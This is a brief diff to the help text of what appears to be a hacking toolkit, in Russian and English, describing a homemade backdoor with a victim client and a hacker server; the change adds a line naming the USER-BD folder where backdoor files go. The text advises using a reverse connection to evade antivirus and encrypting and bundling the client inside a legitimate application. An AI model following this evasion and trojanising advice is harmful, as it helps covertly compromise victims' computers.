@@ -175,6 +175,7 @@ def DefSec4():
 		И так я написал простенький бэкдор состоит он из:
 		1-Клиент для жертвы
 		2-Сервер для хакера
+		В папке USER-BD будут сохранены файлы backdoor
 		Чтоб антивирусы не палили бэкдор,соединение произходит самой жертвой,
 		то есть соединение будет происходить к серверу.
 		НО прежде чем использовать Клиент надо зашифровать и склеить с приложением
@@ -186,6 +187,7 @@ def DefSec4():
 		And so I wrote a simple backdoor it consists of:
 		1-Client for the victim
 		2-Server for the hacker
+		Backdoor files will be saved in the USER-BD folder
 		So that antiviruses do not fire backdoor, the connection is made by the victim itself,
 		that is, the connection will occur to the server.
 		BUT before using the Client must be encrypted and glued with the application
